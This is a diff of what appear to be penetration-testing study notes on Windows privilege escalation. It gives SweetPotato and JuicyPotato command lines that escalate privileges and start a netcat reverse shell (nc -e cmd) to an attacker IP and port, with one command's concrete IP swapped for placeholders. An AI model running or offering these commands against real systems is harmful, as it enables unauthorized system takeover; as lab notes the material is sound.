@@ -258,7 +258,7 @@ C:\Users\Public\reverseshell.exe
 		- Apparently just the best potato
 		- https://github.com/CCob/SweetPotato
 			- Compiled pretty painlessly after cloning the repo in Visual Studio 2022
-		- `.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"` works pretty well
+		- `.\SweetPotato.exe -e EfsRpc -p {path_to_nc.exe} -a "{kali_ip} {listening_port} -e cmd"` works pretty well
 	- JuicyPotato
 		- https://github.com/ohpe/juicy-potato/releases/tag/v0.1
 		- `C:\Users\Public\JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd.exe -a "/c {nc.exe_path} {kali_IP} {kali_port} -e cmd.exe" -t *`
